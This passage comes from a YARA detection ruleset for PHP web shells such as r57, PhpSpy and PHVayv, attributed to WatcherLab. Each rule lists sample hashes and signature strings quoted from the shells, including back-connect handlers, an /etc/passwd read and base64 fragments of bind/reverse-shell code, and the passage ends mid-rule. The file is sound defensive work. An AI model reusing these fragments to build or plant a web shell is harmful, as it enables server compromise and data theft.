      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a_56
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash6 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash7 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash8 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash9 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash10 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash11 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash12 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash13 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash14 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash15 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash16 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash17 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash18 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']==\"C\"))" fullword ascii
      $s2 = "if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == \"search_text\")" fullword ascii
      $s3 = "$this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);" fullword ascii
      $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask" fullword ascii
      $s5 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii
      $s6 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii
      $s7 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii
      $s8 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii
      $s9 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii
      $s10 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii
      $s11 = "if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']==\"Perl\"))" fullword ascii
      $s12 = "if(!empty($_POST['cmd']) && $_POST['cmd'] == \"find_text\")" fullword ascii
      $s13 = "if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']==\"C\"))" fullword ascii
      $s14 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"save_file\")" fullword ascii
      $s15 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mk\")" fullword ascii
      $s16 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ch_\")" fullword ascii
      $s17 = "/* --------------------------------------------------------------- */" fullword ascii
      $s18 = "if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))" fullword ascii
      $s19 = "function GetFileMatchesCount() { return $this->FileMatchesCount; }" fullword ascii
      $s20 = "else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _predator_R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4_57
{
   meta:
      description = "php22 - from files predator.php, R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57Shell_b16fdf4a3fc21892dcf5f69f802dbd928642b5a4.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1e12e85663c7eba9a0b28f6d73a7aecc4e88c36cffcfff9203f2f7f9e9a234f2"
      hash2 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash3 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash4 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash5 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash6 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash7 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash8 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash9 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash10 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash11 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash12 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash13 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash14 = "71a6b712bed415a8bbfc02e006904d63dca15e0c778f607888e776bc9df700db"
      hash15 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash16 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash17 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash18 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash19 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash20 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash21 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" fullword ascii
      $s2 = "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" fullword ascii
      $s3 = "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" fullword ascii
      $s4 = "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2" fullword ascii
      $s5 = "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" fullword ascii
      $s6 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I" fullword ascii
      $s7 = "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp" fullword ascii
      $s8 = "JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV" fullword ascii
      $s9 = "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9" fullword ascii
      $s10 = "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" fullword ascii
      $s11 = "lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK" fullword ascii
      $s12 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" fullword ascii
      $s13 = "NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK" fullword ascii
      $s14 = "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt" fullword ascii
      $s15 = "2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu" fullword ascii
      $s16 = "VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs" fullword ascii
      $s17 = "9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld" fullword ascii
      $s18 = "TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG" fullword ascii
      $s19 = "Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N" fullword ascii
      $s20 = "Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0a0a or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r57shell127_r57_1php_r57_4_58
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r57shell127.php, r57_1php.php, r57_4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash5 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
   strings:
      $s1 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s2 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s3 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s4 = "if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id=\"'.$id.'\" style=\"display: none;\">'; " fullword ascii
      $s5 = "echo \"<div align=center><textarea cols=65 rows=10 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DAT" ascii
      $s6 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text77'].\"</div></b></font>\";" fullword ascii
      $s7 = "POST['cmd']!=\"ftp_brute\")){" fullword ascii
      $s8 = "echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\"; " fullword ascii
      $s9 = "echo $te.\"<div align=center id='n'><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW " ascii
      $s10 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>\";  " fullword ascii
      $s11 = "else echo \"[-] ERROR! Can't connect to PostgreSQL server\"; " fullword ascii
      $s12 = "if($pg_on) $select .= '<option>PostgreSQL</option>';" fullword ascii
      $s13 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\"; " ascii
      $s14 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",$select);" fullword ascii
      $s15 = "ABASES;\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</" ascii
      $s16 = "if($ora_on) $select .= '<option>Oracle</option>';" fullword ascii
      $s17 = "else echo \"[-] ERROR! Can't connect to MySQL server\";  " fullword ascii
      $s18 = "while(($row2=@mssql_fetch_array($res2))) " fullword ascii
      $s19 = "while (($row = @mysql_fetch_assoc($res))) " fullword ascii
      $s20 = "while (($row = @mssql_fetch_assoc($res))) " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHVayv_PH_Vayv_PH_Vdayv_59
{
   meta:
      description = "php22 - from files PHVayv.php, PH_Vayv.php, PH_Vdayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f1eb3815669593696f87abcb418c84e8d0708c3831e11a49772a2030f9e5738"
      hash2 = "79ea4abb65d7a5cdaac51f044ad2ff61d9e71f75fe8f475cf360e59eece0ccea"
      hash3 = "4012fe772b284c1d1aa4ed41767230109b725df8e9e39580774663b270c83b1a"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?php echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s3 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s4 = "<a href=\"<?php echo \"$fistik\";?>.php?sildos=<?php echo $ekinci;?>&dizin=<?php echo $dizin;?>\" style=\"text-decoration: no" fullword ascii
      $s5 = "<a href=\"<?php echo \"$fistik.php?dizin=$dizin/\" ?><?php echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s6 = "<a href=\"<?php echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<a href=\"<?php echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$dizin/$duzenle\"?></font><" fullword ascii
      $s9 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"<?php echo \"$fistik\";?>.php?duzenle=<?php echo \"$ekinci\";?>&dizin" ascii
      $s10 = "<a color=\"#9F9F9F\" target=\"_blank\" href=\"<?php echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none\"><f" ascii
      $s11 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"<?php echo \"$fistik\";?>.php?duzenle=<?php echo \"$ekinci\";?>&dizin" ascii
      $s12 = "<a color=\"#9F9F9F\" target=\"_blank\" href=\"<?php echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none\"><f" ascii
      $s13 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$dizin\"?></font></td>" fullword ascii
      $s14 = "<font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$ekinci\" ?></font></td>" fullword ascii
      $s15 = "<font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$ekinci\" ?></font>" fullword ascii
      $s16 = "rows=\"24\" cols=\"122\" wrap=\"OFF\"><?php $baglan=fopen(\"$dizin/$duzenle\",'r');" fullword ascii
      $s17 = "<?php if ($dizin== \"\"){$dizin=realpath('.');}{$dizin=realpath($dizin);}?>" fullword ascii
      $s18 = "<a href=\"<?php echo \"$fistik.php?dizin=$dizin/../\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s19 = "t color=\"#9F9F9F\">Sistem Bilgisi</font></a></font></font></span></td>" fullword ascii
      $s20 = "<?php if ($yeniklasor > \"\") {mkdir(\"$dizin/$duzenx2\",777);}?>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_bd_r57shell1_40_r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b_r57shell_v_1_42_edited_by_kibngdefacer_60
{
   meta:
      description = "php22 - from files r57-bd.php, r57shell1.40.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash2 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash3 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash4 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $s1 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s2 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"//unlink(\\\"r57shell.php\\\");\\r\\n//readfile(\\\"/etc/passwd\\\");" ascii
      $s3 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"//unlink(\\\"r57shell.php\\\");\\r\\n//readfile(\\\"/etc/passwd\\\");" ascii
      $s4 = "echo sr(25,\"<b>\".$lang[$language.'_text106'].$arrow.\"</b>\",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):(\"b" ascii
      $s5 = "echo $fs.$table_up1.div_title($lang[$language.'_text124'],'id27').$table_up2.div('id27').$ts;" fullword ascii
      $s6 = "echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id7').$table_up2.div('id7').$ts;" fullword ascii
      $s7 = "echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id20').$table_up2.div('id20').$ts;" fullword ascii
      $s8 = "echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id8').$table_up2.div('id8').$ts;" fullword ascii
      $s9 = "echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id13').$table_up2.div('id13').$ts;" fullword ascii
      $s10 = "echo \"<br>\".ws(2).\"Free space : <b>\".view_size($free).\"</b> Total space: <b>\".view_size($all).\"</b>\";" fullword ascii
      $s11 = "echo \"<div align=center>\".div('id10').\"<textarea name=php_eval cols=100 rows=10>\";" fullword ascii
      $s12 = "echo \"Disable functions : <b>\";$df='ini_get  disable!';" fullword ascii
      $s13 = "test13_file1']):(\"<?php info(); ?>\"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));" fullword ascii
      $s14 = "test14_file1']):(\"<?php info(); ?>\"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));" fullword ascii
      $s15 = "test15_file1']):(\"<?php info(); ?>\"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));" fullword ascii
      $s16 = "t_content(\\\"/etc/passwd\\\");\"));" fullword ascii
      $s17 = "rep.txt'," fullword ascii
      $s18 = "echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id10').$table_up2.$font;" fullword ascii
      $s19 = "echo sr(25,\"<b>\".$lang[$language.'_text107'].$arrow.\"</b>\",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):(\"h" ascii
      $s20 = "echo ws(2).\"PHP version: <b>\".@phpversion().\"</b>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHPSPY_PhpSpyVer2006_phpspy_2005_full_phpspy_2006_PhpSpy_Ver_2006_picconf_61
{
   meta:
      description = "php22 - from files PHPSPY.php, PhpSpyVer2006.php, phpspy_2005_full.php, phpspy_2006.php, PhpSpy_Ver_2006.php, picconf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e349d8a219a43f3dd1339ec5ca39764956401f3820b5000fe25ff18845edff29"
      hash2 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
      hash3 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash4 = "b0a12e6daee4649ae1ee375c6b6fde658add204d0d521bc208906385d83036e3"
      hash5 = "b0dcae77eabc407c53c0b2b6fe74d0749bc2fa4fd9a560b40400a64d2959492c"
      hash6 = "828e13e143dc50bcde769128772066e303c7fdb10da81f9b6090978e9b4fbb82"
   strings:
      $s1 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword ascii
      $s2 = "$tabledump = \"INSERT INTO $table VALUES(\";" fullword ascii
      $s3 = "$tabledump .= \" DEFAULT '$field[Default]'\";" fullword ascii
      $s4 = "$tabledump .= \"CREATE TABLE $table (\\n\";" fullword ascii
      $s5 = "$tabledump .= \" $field[Extra]\";" fullword ascii
      $s6 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword ascii
      $s7 = "$tabledump .= \" NOT NULL\";" fullword ascii
      $s8 = "$tabledump .= \"   KEY $kname ($colnames)\";" fullword ascii
      $s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword ascii
      $s10 = "$tabledump .= \");\\n\";" fullword ascii
      $s11 = "$tabledump .= \"\\n);\\n\\n\";" fullword ascii
      $s12 = "$tabledump.=\", \";" fullword ascii
      $s13 = "$tabledump .= \"NULL\";" fullword ascii
      $s14 = "$tabledump .= \"   $field[Field] $field[Type]\";" fullword ascii
      $s15 = "while ($key = mysql_fetch_array($keys)) {" fullword ascii
      $s16 = "$index[$kname][] = $key['Column_name'];" fullword ascii
      $s17 = "$kname=$key['Key_name'];" fullword ascii
      $s18 = "while ($field = mysql_fetch_array($fields)) {" fullword ascii
      $s19 = "while ($row = mysql_fetch_array($rows)) {" fullword ascii
      $s20 = "while(list($kname, $columns) = @each($index)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _oi_php_decode_p0isoN_sh3ll_63
{
   meta:
      description = "php22 - from files oi.php.decode.php, p0isoN.sh3ll.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
      hash2 = "16623a1a16ede2b5c5dea7a7ff0b32516a970915564461842e003133cb3046d3"
   strings:
      $s1 = "if (!$arg1) { echo \"<div class=fxerrmsg>No operation! Please fill parameter [A]!</div>\\n\"; }" fullword ascii
      $s2 = "$fx_infohead = \"File-System Buffer\";" fullword ascii
      $s3 = "if (!empty($fx_infohead)) { echo $fx_infohead; }" fullword ascii
      $s4 = "\"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//\"." fullword ascii
      $s5 = "\"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC\"." fullword ascii
      $s6 = "\"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s7 = "\"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s8 = "else { echo \"<div class=fxerrmsg>Can't download from $arg1!</div>\";}" fullword ascii
      $s9 = "\"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK\"." fullword ascii
      $s10 = "\"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4\"." fullword ascii
      $s11 = "echo \"<input type=submit name=actarcbuff value=\\\"Pack buffer to archive\\\">&nbsp;<input type=\\\"text\\\" name=\\\"actarcbuf" ascii
      $s12 = "\"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31\"." fullword ascii
      $s13 = "\"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV\"." fullword ascii
      $s14 = "\"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/\"." fullword ascii
      $s15 = "\"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp\"." fullword ascii
      $s16 = "\"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD\"." fullword ascii
      $s17 = "\"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61\"." fullword ascii
      $s18 = "\"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw\"." fullword ascii
      $s19 = "\"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr\"." fullword ascii
      $s20 = "uery.value+='`\".$name.\"`';\\\"><b>\".$name.\"</b></a><br>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _PluginPropertiesTest_PluginPropertiesWithSharedCalendarTest_64
{
   meta:
      description = "php22 - from files PluginPropertiesTest.php, PluginPropertiesWithSharedCalendarTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce49f59aee2f413f2b67e8e157e07236825b9c5455a23a614829f1265f7a347c"
